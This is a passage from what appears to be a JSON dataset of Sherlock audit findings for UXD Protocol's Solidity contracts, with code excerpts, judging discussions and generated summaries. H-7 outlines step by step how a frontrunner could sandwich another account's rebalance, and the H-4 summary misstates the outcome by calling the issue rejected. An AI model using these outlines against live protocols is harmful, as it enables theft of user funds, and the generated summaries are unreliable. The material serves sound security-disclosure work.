`_rebalanceNegativePnlWithSwap()`\n\n**WarTech9**\n\nIssue exists in `_rebalanceNegativePnlWithSwap()` before `vault.deposit()`. Need to convert from 18 decimals to 6 for USDC.\nIssue does not exist in `_rebalanceNegativePnlLite` where amount returned by `_placePerpOrder()` is already in 18 decimals. So no conversion required before `vault.withdraw()`.",
      "summary": "\nThis bug report is about the function `vault.deposit` and `vault.withdraw` of vault in contract `PerpDepository` which need to be passed with the amount in raw decimal of tokens (which is different from 18 in case using USDC, WBTC, ... as base and quote tokens). However, some calls miss the conversion of decimals from 18 to token's decimal, and pass wrong decimals into them. This results in the protocol losing a lot of funds and some functionalities of the protocol being broken due to not enough allowance when calling these functions.\n\nThe issue has been found by berndartmueller, yixxas, HollaDieWaldfee, Bahurum, rvierdiiev, duc, and peanuts. It exists in `_rebalanceNegativePnlWithSwap()` before `vault.deposit()` and needs to be converted from 18 decimals to 6 for USDC. The issue does not exist in `_rebalanceNegativePnlLite` where amount returned by `_placePerpOrder()` is already in 18 decimals. So no conversion required before `vault.withdraw()`.\n\nThe code snippets for the issue can be found at https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L498, https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L524, and https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L638. The tool used to identify the issue is Manual Review.\n\nThe recommendation to fix the issue is to convert the param `amount` from token's decimal to decimal 18 before `vault.deposit` and `vault.withdraw`.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/402",
      "tags": [
        "Decimals"
      ],
      "finders": [
        "duc",
        "HollaDieWaldfee",
        "Bahurum",
        "yixxas",
        "berndartmueller",
        "peanuts",
        "rvierdiiev"
      ]
    },
    {
      "id": "6261",
      "title": "M-3: Vulnerable GovernorVotesQuorumFraction version",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/423 \n\n## Found by \nctf\\_sec, HonorLt\n\n## Summary\nThe protocol uses an OZ version of contracts that contain a known vulnerability in government contracts.\n\n## Vulnerability Detail\n```UXDGovernor``` contract inherits from ```GovernorVotesQuorumFraction```:\n```solidity\n contract UXDGovernor is\n    ReentrancyGuard,\n    Governor,\n    GovernorVotes,\n    GovernorVotesQuorumFraction,\n    GovernorTimelockControl,\n    GovernorCountingSimple,\n    GovernorSettings\n```\nAn OZ security recommendation has revealed a known vulnerability in this contract: https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-xrc4-737v-9q75\n\nIt was patched in version _4.7.2_, but this protocol uses an older version:\n  _\"@openzeppelin/contracts\": \"^4.6.0\"_\n\n## Impact\nThe potential impact is described in the OZ advisory.\nThis issue was assigned with a severity of High from OZ, so I am sticking with it in this submission.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/governance/UXDGovernor.sol#L37\n\n## Tool used\n\nManual Review\n\n## Recommendation\nUpdate the OZ version of contracts to version >=_4.7.2_ or at least follow the workarounds of OZ if not possible otherwise.\n\n## Discussion\n\n**WarTech9**\n\nThis was already fixed here: https://github.com/UXDProtocol/uxd-evm/commit/dcaa0e857111f3f7946ee5c5a188dbb23ca80859\n\n**hrishibhat**\n\nThis requires certain scenario where the previous quorum should have failed & the quorum fraction has to be changed post which this issue could be valid. \nConsidering this issue a valid medium.",
      "summary": "\nThis bug report is about an issue found in the UXDGovernor contract which inherits from GovernorVotesQuorumFraction. This contract contains a known vulnerability that was patched in version 4.7.2 but the protocol used in this report uses an older version (4.6.0). The potential impact is described in the OpenZeppelin security advisory, which is assigned with a severity of High. The code snippet is available at the given link and the bug was found through manual review. To fix the issue, the OpenZeppelin version of contracts should be updated to version 4.7.2 or follow the workarounds provided by OpenZeppelin. A discussion was had and it was concluded that the issue was valid.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/423",
      "tags": [
        "OZ Version"
      ],
      "finders": [
        "HonorLt",
        "ctf\\_sec"
      ]
    },
    {
      "id": "6260",
      "title": "M-2: `PerpDepository._rebalanceNegativePnlWithSwap()` shouldn't use a `sqrtPriceLimitX96` twice.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/425 \n\n## Found by \nhansfriese\n\n## Summary\n`PerpDepository._rebalanceNegativePnlWithSwap()` shouldn't use a `sqrtPriceLimitX96` twice.\n\n## Vulnerability Detail\nCurrently, `_rebalanceNegativePnlWithSwap()` uses a `sqrtPriceLimitX96` param twice for placing a perp order and swapping.\n\n```solidity\n    function _rebalanceNegativePnlWithSwap(\n        uint256 amount,\n        uint256 amountOutMinimum,\n        uint160 sqrtPriceLimitX96,\n        uint24 swapPoolFee,\n        address account\n    ) private returns (uint256, uint256) {\n        uint256 normalizedAmount = amount.fromDecimalToDecimal(\n            ERC20(quoteToken).decimals(),\n            18\n        );\n        _checkNegativePnl(normalizedAmount);\n        bool isShort = false;\n        bool amountIsInput = true;\n        (uint256 baseAmount, uint256 quoteAmount) = _placePerpOrder(\n            normalizedAmount,\n            isShort,\n            amountIsInput,\n            sqrtPriceLimitX96\n        );\n        vault.withdraw(assetToken, baseAmount);\n        SwapParams memory params = SwapParams({\n            tokenIn: assetToken,\n            tokenOut: quoteToken,\n            amountIn: baseAmount,\n            amountOutMinimum: amountOutMinimum,\n            sqrtPriceLimitX96: sqrtPriceLimitX96, //@audit \n            poolFee: swapPoolFee\n        });\n        uint256 quoteAmountOut = spotSwapper.swapExactInput(params);\n```\n\nIn `_placePerpOrder()`, it uses the uniswap pool inside the perp protocol and uses a `spotSwapper` for the second swap which is for the uniswap as well.\n\nBut as we can see [here](https://docs.uniswap.org/concepts/protocol/fees#pool-fees-tiers), Uniswap V3 introduces multiple pools for each token pair and 2 pools might be different and I think it's not good to use the same `sqrtPriceLimitX96` for different pools.\n\nAlso, I think it's not mandatory to check a `sqrtPriceLimitX96` as it checks `amountOutMinimum` already. (It checks `amountOutMinimum` only in `_openLong()` and `_openShort()`.)\n\n## Impact\n`PerpDepository._rebalanceNegativePnlWithSwap()` might revert when it should work as it uses the same `sqrtPriceLimitX96` for different pools.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L478\n\n## Tool used\nManual Review\n\n## Recommendation\nI think we can use the `sqrtPriceLimitX96` param for one pool only and it would be enough as there is an `amountOutMinimum` condition.",
      "summary": "\nThis bug report is about the `PerpDepository._rebalanceNegativePnlWithSwap()` function in the PerpDepository.sol file of the 2023-01-uxd-judging repository. The bug was found by hansfriese and is related to the use of the `sqrtPriceLimitX96` parameter. \n\nCurrently, the `_rebalanceNegativePnlWithSwap()` function uses the `sqrtPriceLimitX96` parameter twice for placing a perp order and swapping. The issue is that Uniswap V3 introduces multiple pools for each token pair and using the same `sqrtPriceLimitX96` for different pools might cause the function to revert when it should work.\n\nThe impact of this bug is that `PerpDepository._rebalanceNegativePnlWithSwap()` might revert when it should work as it uses the same `sqrtPriceLimitX96` for different pools. The code snippet can be found at https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L478. The bug was found through manual review.\n\nThe recommendation for this bug is to use the `sqrtPriceLimitX96` parameter for one pool only, as there is an `amountOutMinimum` condition.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/425",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "6259",
      "title": "M-1: `rebalanceLite` should provide a slippage protection",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/429 \n\n## Found by \nHollaDieWaldfee, hansfriese\n\n## Summary\nUsers can lose funds while rebalancing.\n\n## Vulnerability Detail\nThe protocol provides two kinds of rebalancing functions - `rebalance()` and `rebalanceLite()`.\nWhile the function `rebalance()` is protected from an unintended slippage because the caller can specify `amountOutMinimum`, `rebalanceLite()` does not have this protection.\nThis makes the user vulnerable to unintended slippage due to various scenarios.\n```solidity\nPerpDepository.sol\n597:     function rebalanceLite(\n598:         uint256 amount,\n599:         int8 polarity,\n600:         uint160 sqrtPriceLimitX96,\n601:         address account\n602:     ) external nonReentrant returns (uint256, uint256) {\n603:         if (polarity == -1) {\n604:             return\n605:                 _rebalanceNegativePnlLite(amount, sqrtPriceLimitX96, account);\n606:         } else if (polarity == 1) {\n607:             // disable rebalancing positive PnL\n608:             revert PositivePnlRebalanceDisabled(msg.sender);\n609:             // return _rebalancePositivePnlLite(amount, sqrtPriceLimitX96, account);\n610:         } else {\n611:             revert InvalidRebalance(polarity);\n612:         }\n613:     }\n614:\n615:     function _rebalanceNegativePnlLite(\n616:         uint256 amount,\n617:         uint160 sqrtPriceLimitX96,\n618:         address account\n619:     ) private returns (uint256, uint256) {\n620:         uint256 normalizedAmount = amount.fromDecimalToDecimal(\n621:             ERC20(quoteToken).decimals(),\n622:             18\n623:         );\n624:\n625:         _checkNegativePnl(normalizedAmount);\n626:         IERC20(quoteToken).transferFrom(account, address(this), amount);\n627:         IERC20(quoteToken).approve(address(vault), amount);\n628:         vault.deposit(quoteToken, amount);\n629:\n630:         bool isShort = false;\n631:         bool amountIsInput = true;\n632:         (uint256 baseAmount, uint256 quoteAmount) = _placePerpOrder(\n633:             normalizedAmount,\n634:             isShort,\n635:             amountIsInput,\n636:             sqrtPriceLimitX96\n637:         );\n638:         vault.withdraw(assetToken, baseAmount);\n639:         IERC20(assetToken).transfer(account, baseAmount);\n640:\n641:         emit Rebalanced(baseAmount, quoteAmount, 0);\n642:\n643:         return (baseAmount, quoteAmount);\n644:     }\n```\nEspecially, according to the communication with the PERP dev team, it is possible for the Perp's ClearingHouse to fill the position partially when the price limit is specified (`sqrtPriceLimitX96`).\nIt is also commented in the Perp contract comments [here](https://github.com/perpetual-protocol/perp-curie-contract/blob/27ea8e2c4be37d1dd58c1eed3b3cc269d398a091/contracts/ClearingHouse.sol#L63).\n```solidity\n63:     /// @param sqrtPriceLimitX96 tx will fill until it reaches this price but WON'T REVERT\n64:     struct InternalOpenPositionParams {\n65:         address trader;\n66:         address baseToken;\n67:         bool isBaseToQuote;\n68:         bool isExactInput;\n69:         bool isClose;\n70:         uint256 amount;\n71:         uint160 sqrtPriceLimitX96;\n72:     }\n```\nSo it is possible that the order is not placed to the full amount.\nAs we can see in the #L626~#L628, the UXD protocol grabs the quote token of `amount` and deposits to the Perp's vault.\nAnd the unused amount will remain in the Perp vault while this is supposed to be returned to the user who called this rebalance function.\n\n## Impact\nUsers can lose funds while lite rebalancing.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L597\n\n## Tool used\nManual Review\n\n## Recommendation\nAdd a protection parameter to the function `rebalanceLite()` so that the user can specify the minimum out amount.\n\n## Discussion\n\n**WarTech9**\n\nThe caller can specify the target price using the `sqrtPriceLimitX96` parameter to the `rebalanceLite` function. This offers slippage protection.\n\n\n**hansfriese**\n\nEscalate for 10 USDC\n\nI suggest the judge and the sponsor read this issue carefully again.\nThe key problem is that the Perp protocol can partially fill the position, especially when the `sqrtPriceLimitX96 ` is specified.\n(This is related to how Uniswap works, check [here](https://jeiwan.net/posts/public-bug-report-uniswap-swaprouter/))\nSo it is possible that the order is not placed to the full amount and the remaining amount should be returned to the user.\nI admit that my explanation sounded vague because I mentioned slippage.\nI mean, the protocol should return the remaining value or allow the user to explicitly specify the minimum output amount.\nPlease check the screenshot of the chat I had with the Perp team.\nThey confirmed it is possible that the order is not filled to the full amount when the `sqrtPriceLimitX96 ` is specified.\n\n![screenshot_47](https://user-images.githubusercontent.com/45533148/216356589-8b3751ad-8731-401b-853f-dbb93512a80c.png)\n![screenshot_48](https://user-images.githubusercontent.com/45533148/216356592-e752dc2e-26cb-42d1-bf5e-e4c91c3928fe.png)\n\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> I suggest the judge and the sponsor read this issue carefully again.\n> The key problem is that the Perp protocol can partially fill the position, especially when the `sqrtPriceLimitX96 ` is specified.\n> (This is related to how Uniswap works, check [here](https://jeiwan.net/posts/public-bug-report-uniswap-swaprouter/))\n> So it is possible that the order is not placed to the full amount and the remaining amount should be returned to the user.\n> I admit that my explanation sounded vague because I mentioned slippage.\n> I mean, the protocol should return the remaining value or allow the user to explicitly specify the minimum output amount.\n> Please check the screenshot of the chat I had with the Perp team.\n> They confirmed it is possible that the order is not filled to the full amount when the `sqrtPriceLimitX96 ` is specified.\n> \n> ![screenshot_47](https://user-images.githubusercontent.com/45533148/216356589-8b3751ad-8731-401b-853f-dbb93512a80c.png)\n> ![screenshot_48](https://user-images.githubusercontent.com/45533148/216356592-e752dc2e-26cb-42d1-bf5e-e4c91c3928fe.png)\n> \n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**WarTech9**\n\nWith the updated comments I agree there is a valid issue here. If the requested amount is not filled completely in the Perp order, we should only transfer from the user the amount returned from the `_placePerpOrder()` call. \n\n**hrishibhat**\n\nEscalation accepted. \n\nAs pointed out in the Escalation that there is the possibility of partial order fills when sqrtPriceLimitX96 is specified. \n\n**sherlock-admin**\n\n> Escalation accepted. \n> \n> As pointed out in the Escalation that there is the possibility of partial order fills when sqrtPriceLimitX96 is specified. \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nBug report M-1 is about a vulnerability found in the `rebalanceLite()` function of the protocol. This function does not have a protection parameter to specify the minimum out amount, which makes users vulnerable to unintended slippage due to various scenarios. The Perp's ClearingHouse can fill the position partially when the price limit is specified (`sqrtPriceLimitX96`). The unused amount will remain in the Perp vault while this is supposed to be returned to the user who called this rebalance function. This bug was found by HollaDieWaldfee and hansfriese. \n\nThe impact of this bug is that users can lose funds while lite rebalancing. \n\nThe code snippet for this bug is available at https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L597. Manual review was the tool used to find this bug. \n\nThe recommendation for this bug is to add a protection parameter to the function `rebalanceLite()` so that the user can specify the minimum out amount. This was accepted by sherlock-admin, and contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/429",
      "tags": [
        "Slippage"
      ],
      "finders": [
        "HollaDieWaldfee",
        "hansfriese"
      ]
    },
    {
      "id": "6258",
      "title": "H-7: User specified slippage allows frontrunning",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/192 \n\n## Found by \nHonorLt, minhtrng, jonatascm, koxuan, yixxas, wagmi, ck, HollaDieWaldfee, zeroknots, GimelSec, peanuts, keccak123\n\n## Summary\n\n`rebalance` and `rebalanceLite` can be called by any user. Assets are taken from a user specified `account` address which has approved PerpDepository. If an address has a non-zero approval for PerpDepository, a frontrunner can use `rebalance` to transfer funds and profit by sandwiching the Uniswap pool swap.\n\n## Vulnerability Detail\n\nWhen `mint` or `redeem` is called in UXDController, `msg.sender` is where the value is coming from. But `rebalance` allows for the caller to specify [the `account` where funds are coming from](https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L452). This means `msg.sender` can be any address. This allows for different scenarios where a frontrunner can profit with these steps.\n1. a frontrunner detects a call of `rebalance` transaction in the mempool for a certain account address\n2. the frontrunner duplicates the transaction but increases the gas amount (to allow frontrunning the original transaction) and changes the `amountOutMinimum` value to zero\n3. the frontrunner can profit by sandwiching the Uniswap swap which now has no slippage setting\n4. The user will lose value \n\n## Impact\n\nAn account that is used in `rebalance` can lose value\n\n## Code Snippet\n\n`rebalance` can be frontrun\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L446\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n`rebalance` and `rebalanceLite` should use `msg.sender` to replace the function argument account address.\n\n## Discussion\n\n**WarTech9**\n\nThis is a duplicate of #288",
      "summary": "\nThis bug report is about the vulnerability of the `rebalance` and `rebalanceLite` functions in UXDController. It was found by HonorLt, minhtrng, jonatascm, koxuan, yixxas, wagmi, ck, HollaDieWaldfee, zeroknots, GimelSec, peanuts, and keccak123. The issue is that `rebalance` and `rebalanceLite` can be called by any user and assets are taken from a user-specified `account` address, which has approved PerpDepository. This allows for a frontrunner to use `rebalance` to transfer funds and profit by sandwiching the Uniswap pool swap. This could lead to an account that is used in `rebalance` losing value. The code snippet provided is from PerpDepository.sol line 446. The recommendation is to use `msg.sender` to replace the function argument account address. WarTech9 mentioned that this was a duplicate of issue #288.",
      "quality_score": 2.6666666666666665,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/192",
      "tags": [
        "Slippage",
        "Front-Running"
      ],
      "finders": [
        "keccak123",
        "zeroknots",
        "HollaDieWaldfee",
        "yixxas",
        "koxuan",
        "GimelSec",
        "peanuts",
        "wagmi",
        "HonorLt",
        "minhtrng",
        "jonatascm",
        "ck"
      ]
    },
    {
      "id": "6257",
      "title": "H-6: PerpDepository#getPositionValue uses incorrect value for TWAP interval allowing more than intended funds to be extracted",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/249 \n\n## Found by \nHonorLt, 0x52, berndartmueller, 0Kage, cccz, DecorativePineapple, ctf\\_sec\n\n## Summary\n\nPerpDepository#getPositionValue queries the exchange for the mark price to calculate the unrealized PNL. Mark price is defined as the 15 minute TWAP of the market. The issue is that it uses the 15 second TWAP instead of the 15 minute TWAP\n\n## Vulnerability Detail\n\nAs stated in the [docs](https://support.perp.com/hc/en-us/articles/5331299807513-Liquidation) and as implemented in the [ClearHouseConfig](https://optimistic.etherscan.io/address/0xa4c817a425d3443baf610ca614c8b11688a288fb#readProxyContract) contract, the mark price is a 15 minute / 900 second TWAP.\n\n    function getPositionValue() public view returns (uint256) {\n        uint256 markPrice = getMarkPriceTwap(15);\n        int256 positionSize = IAccountBalance(clearingHouse.getAccountBalance())\n            .getTakerPositionSize(address(this), market);\n        return markPrice.mulWadUp(_abs(positionSize));\n    }\n\n    function getMarkPriceTwap(uint32 twapInterval)\n        public\n        view\n        returns (uint256)\n    {\n        IExchange exchange = IExchange(clearingHouse.getExchange());\n        uint256 markPrice = exchange\n            .getSqrtMarkTwapX96(market, twapInterval)\n            .formatSqrtPriceX96ToPriceX96()\n            .formatX96ToX10_18();\n        return markPrice;\n    }\n\nAs seen in the code above getPositionValue uses 15 as the TWAP interval. This means it is pulling a 15 second TWAP rather than a 15 minute TWAP as intended.\n\n## Impact\n\nThe mark price and by extension the position value will frequently be different from true mark price of the market allowing for larger rebalances than should be possible.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L708-L713\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nI recommend pulling pulling the TWAP fresh each time from ClearingHouseConfig, because the TWAP can be changed at anytime. If it is desired to make it a constant then it should at least be changed from 15 to 900.",
      "summary": "\nThis bug report is about an issue with the PerpDepository#getPositionValue function of the Sherlock Audit 2023-01-uxd-judging project. The function queries the exchange for the mark price to calculate the unrealized PNL, but it uses the 15 second TWAP instead of the 15 minute TWAP as stated in the docs. This means it is pulling a 15 second TWAP rather than a 15 minute TWAP as intended, which will frequently lead to the mark price and by extension the position value being different from the true mark price of the market, allowing for larger rebalances than should be possible. The code snippet that was used is available at the given URL. The issue was found by HonorLt, 0x52, berndartmueller, 0Kage, cccz, DecorativePineapple, ctf\\_sec. The tool used was manual review. The recommendation is to pull the TWAP fresh each time from ClearingHouseConfig or to make it a constant and change it from 15 to 900.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/249",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "DecorativePineapple",
        "0x52",
        "cccz",
        "berndartmueller",
        "0Kage",
        "HonorLt",
        "ctf\\_sec"
      ]
    },
    {
      "id": "6256",
      "title": "H-5: USDC deposited to PerpDepository.sol are irretrievable and effectively causes UDX to become undercollateralized",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/250 \n\n## Found by \ncsanuragjain, 0x52\n\n## Summary\n\nPerpDepository rebalances negative PNL into USDC holdings. This preserves the delta neutrality of the system by exchanging base to quote. This is problematic though as once it is in the vault as USDC it can never be withdrawn. The effect is that the delta neutral position can never be liquidated but the USDC is inaccessible so UDX is effectively undercollateralized. \n\n## Vulnerability Detail\n\n`_processQuoteMint`, `_rebalanceNegativePnlWithSwap` and `_rebalanceNegativePnlLite` all add USDC collateral to the system. There were originally two ways in which USDC could be removed from the system. The first was positive PNL rebalancing, which has now been deactivated. The second is for the owner to remove the USDC via `withdrawInsurance`.\n\n    function withdrawInsurance(uint256 amount, address to)\n        external\n        nonReentrant\n        onlyOwner\n    {\n        if (amount == 0) {\n            revert ZeroAmount();\n        }\n\n        insuranceDeposited -= amount;\n\n        vault.withdraw(insuranceToken(), amount);\n        IERC20(insuranceToken()).transfer(to, amount);\n\n        emit InsuranceWithdrawn(msg.sender, to, amount);\n    }\n\nThe issue is that `withdrawInsurance` cannot actually redeem any USDC. Since insuranceDeposited is a uint256 and is decremented by the withdraw, it is impossible for more USDC to be withdrawn then was originally deposited.\n\nThe result is that there is no way for the USDC to ever be redeemed and therefore over time will lead to the system becoming undercollateralized due to its inaccessibility.\n\n## Impact\n\nUDX will become undercollateralized and the ecosystem will spiral out of control\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L478-L528\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L615-L644\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L385-L397\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow all USDC now deposited into the insurance fund to be redeemed 1:1",
      "summary": "\nThis bug report is about the USDC deposited to PerpDepository.sol being irretrievable and causing UDX to become undercollateralized. It was found by csanuragjain and 0x52. The problem is related to the functions `_processQuoteMint`, `_rebalanceNegativePnlWithSwap` and `_rebalanceNegativePnlLite`, which all add USDC collateral to the system. There were originally two ways in which USDC could be removed from the system, but the first was deactivated and the second, `withdrawInsurance`, cannot actually redeem any USDC due to the fact that insuranceDeposited is a uint256 and is decremented by the withdraw. This means that the USDC can never be redeemed, leading to the system becoming undercollateralized over time. The impact of this bug is that UDX will become undercollateralized and the ecosystem will spiral out of control. The code snippets related to this bug can be found at the given links. The tool used for finding this bug was Manual Review. The recommendation for this bug is to allow all USDC now deposited into the insurance fund to be redeemed 1:1.",
      "quality_score": 2.6666666666666665,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/250",
      "tags": [
        "Overflow/Underflow",
        "Business Logic"
      ],
      "finders": [
        "csanuragjain",
        "0x52"
      ]
    },
    {
      "id": "6255",
      "title": "H-4: PerpDepository has no way to withdraw profits depriving stakers of profits owed",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/251 \n\n## Found by \n0x52\n\n## Summary\n\nPerpDepository has no way to calculate or withdraw any profits made by the vault. By [design](https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/rage-trade/RageDnDepository.sol#L99-L115) stakes are entitled to a portion of the profits generated by the delta-neutral strategy. The issue is that the vault never implements a way to withdraw profits to stakers, resulting in loss of revenue for them.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nProfits owed stakers will be trapped in the contract and they will lose that portion of their revenue\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L25\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCreate a function to calculate and withdraw protocol profit to be awarded to stakers\n\n## Discussion\n\n**WarTech9**\n\nProfits on `PerpDepository` are currently locked in the depository and can be unlocked in future updates through positive PnL rebalancing.\n`RageDepository` profits are locked in that contract and can be withdrawn by the contract owner (governance) through the `withdrawProfits()` function\n\n**rvierdiyev**\n\nEscalate for 11 USDC.\n\nThis is not a vulnerability.\nAs @WarTech9 said, \n>`RageDepository` profits are locked in that contract and can be withdrawn by the contract owner (governance) through the `withdrawProfits()` function\n\nThis is design choice of protocol. I have discussed that during the contest with @WarTech9, so he explained me that and i didn't submit that as issue. As he said, that rewards are not lost and governance can withdraw it later to reuse.\n\nAlso author of report states in impact section that:\n> Profits owed stakers will be trapped in the contract and they will lose that portion of their revenue\n\nBut this is not true, as i described above, that value is not stucked as protocol can withdraw it.\n\n**sherlock-admin**\n\n > Escalate for 11 USDC.\n> \n> This is not a vulnerability.\n> As @WarTech9 said, \n> >`RageDepository` profits are locked in that contract and can be withdrawn by the contract owner (governance) through the `withdrawProfits()` function\n> \n> This is design choice of protocol. I have discussed that during the contest with @WarTech9, so he explained me that and i didn't submit that as issue. As he said, that rewards are not lost and governance can withdraw it later to reuse.\n> \n> Also author of report states in impact section that:\n> > Profits owed stakers will be trapped in the contract and they will lose that portion of their revenue\n> \n> But this is not true, as i described above, that value is not stucked as protocol can withdraw it.\n\nYou've created a valid escalation for 11 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation rejected\n\nThis is in PerpDepository and not RageDepository. Profits in PerpDepository are stuck with no method to unlock them except while upgrading the contract. \nAlthough contract upgrades are to be used for feature updates and add changes to handle extreme situations, this issue is clearly a smart contract bug where funds are locked.  \n\n**sherlock-admin**\n\n> Escalation rejected\n> \n> This is in PerpDepository and not RageDepository. Profits in PerpDepository are stuck with no method to unlock them except while upgrading the contract. \n> Although contract upgrades are to be used for feature updates and add changes to handle extreme situations, this issue is clearly a smart contract bug where funds are locked.  \n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nThis bug report is about the PerpDepository contract, which is part of a larger protocol. The issue is that the PerpDepository contract has no way to calculate or withdraw any profits made by the vault, which deprives stakers of profits owed to them. This is due to a design flaw in the contract, where stakes are entitled to a portion of the profits generated by the delta-neutral strategy, but no mechanism to withdraw the profits. This means that profits owed to stakers will be trapped in the contract, resulting in a loss of revenue for them. The code snippet linked in the report shows the relevant section of the contract. After discussion, it was concluded that this is a smart contract bug, and the issue was rejected. This means that the Watsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "quality_score": 3.000194745000896,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/251",
      "tags": [
        "Fund Lock"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "6254",
      "title": "H-3: RageTrade senior vault USDC deposits are subject to utilization caps which can lock deposits for long periods of time leading to UXD instability",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/253 \n\n## Found by \nclems4ever, ctf\\_sec, 0x52, 0xNazgul\n\n## Summary\n\nRageTrade senior vault requires that it maintains deposits above and beyond the current amount loaned to the junior vault. Currently this is set at 90%, that is the vault must maintain at least 10% more deposits than loans. Currently the junior vault is in high demand and very little can be withdrawn from the senior vault. A situation like this is far from ideal because in the even that there is a strong depeg of UXD a large portion of the collateral could be locked in the vault unable to be withdrawn.\n\n## Vulnerability Detail\n\n[DnGmxSeniorVault.sol](https://arbiscan.io/address/0x66aca71a2e62022f9f23a50ab737ded372ad00cf#code#F31#L288)\n\n    function beforeWithdraw(\n        uint256 assets,\n        uint256,\n        address\n    ) internal override {\n        /// @dev withdrawal will fail if the utilization goes above maxUtilization value due to a withdrawal\n        // totalUsdcBorrowed will reduce when borrower (junior vault) repays\n        if (totalUsdcBorrowed() > ((totalAssets() - assets) * maxUtilizationBps) / MAX_BPS)\n            revert MaxUtilizationBreached();\n\n        // take out required assets from aave lending pool\n        pool.withdraw(address(asset), assets, address(this));\n    }\n\nDnGmxSeniorVault.sol#beforeWithdraw is called before each withdraw and will revert if the withdraw lowers the utilization of the vault below a certain threshold. This is problematic in the event that large deposits are required to maintain the stability of UXD.\n\n## Impact\n\nUXD may become destabilized in the event that the senior vault has 